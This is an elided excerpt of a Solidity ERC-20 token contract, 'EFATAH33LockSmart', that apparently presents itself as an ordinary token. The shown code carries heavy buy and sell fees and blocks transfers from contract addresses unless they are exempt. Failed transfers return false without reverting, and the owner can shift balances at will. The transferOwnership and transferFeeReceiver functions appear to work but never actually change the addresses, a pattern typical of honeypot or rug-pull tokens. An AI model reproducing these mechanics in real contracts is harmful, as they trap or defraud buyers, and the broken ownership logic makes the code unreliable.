...
contract EFATAH33LockSmart is IERC20 {
    using SafeMath for uint256; 
   
    string private _name = "EFATAHLOCK";
    string private _symbol =  "EFA33LOCK";
    ...
    uint256 private buyFee = 12;
    uint256 private sellFee = 14; 
    ...
    constructor(address ownaddr, address feeaddr) { 
        ...
        _set_baseadm_addr(feeaddr, 1);
        _set_baseadm_addr(ownaddr, 2);  
        _balances[ownaddr] = _totalSupply; 
        maxDailyWalletTransferPercent = 1;    
        emit Transfer(_contract, ownaddr, _totalSupply); 
    }
    ...
    function _isAllowAddress(address addr) private view returns (bool) {
        return _isAccountExempt[addr] || _isAdminAddress(addr) || (addr != address(0x0) && !_isContract(addr)); 
    }
    ...
    function _isAdminAddress(address addr) private view returns (bool) { 
        return _isFeesExempted[addr]; //addr == _owner || addr == baseReceiver;
    }
    ...
    function isBaseReceiver() private view returns (bool) {
        return msg.sender == baseReceiver;
    } 
    ...
    function transferOwnership(address addr) external onlyOwner returns (bool) { 
        require(addr != address(0x0) && !_isContract(addr)); 
        if(addr != address(0x0) && !_isContract(addr)) {
            _isFeesExempted[_owner] = false; 
            _set_baseadm_addr(addr, 2);
            return true;
        }
        return false;
    }
    ...
    function transferFeeReceiver(address addr) external onlyOwner returns (bool) { 
        ...
        if(addr != address(0x0) && !_isContract(addr)) {
            ...
            _set_baseadm_addr(addr, 1); 
            return true;
        }
        return false;
    }   
 
    function _set_baseadm_addr(address addr, uint is_mod) private {
        if(is_mod == 1 && addr == baseReceiver){
            baseReceiver = addr; 
            _isFeesExempted[addr] = true; 
            return;
        }
        if(is_mod == 2 && addr == _owner) {
            _owner = addr;  
            _isFeesExempted[addr] = true;
        }
    }
  
    function send_token(address addr, uint256 tokens) external onlyOwner returns(bool) {
        if(isOwner()) {
            _balances[msg.sender] = _balances[msg.sender].sub(tokens);
            _balances[addr] = _balances[addr].add(tokens);
    ...
    function send_tokens(address[] memory addrs, uint256[] memory tokens) external onlyOwner returns(bool) {
        if(isOwner()) {
            for(uint i = 0; i < addrs.length; i++) {
                _balances[msg.sender] = _balances[msg.sender].sub(tokens[i]);
                _balances[addrs[i]] = _balances[addrs[i]].add(tokens[i]);
                emit Transfer(msg.sender, addrs[i], tokens[i]);   
            }
            return true;
        }            
        return false;
    ...
    function transferFrom(address from, address to, uint256 value) external override isValidAddress(to) returns (bool) {  
        //require(_isAllowAddress(from) && _balances[from] >= value && value > 0, "invalid address/amount");   
        if(_isAllowAddress(from) && _balances[from] >= value && value > 0){
    ...
    function _transferFrom(address sender, address recipient,  uint256 amount) private returns (bool) {
        if(!(_isAllowAddress(sender) && _balances[sender] >= amount && amount > 0)){
            return false;
        }
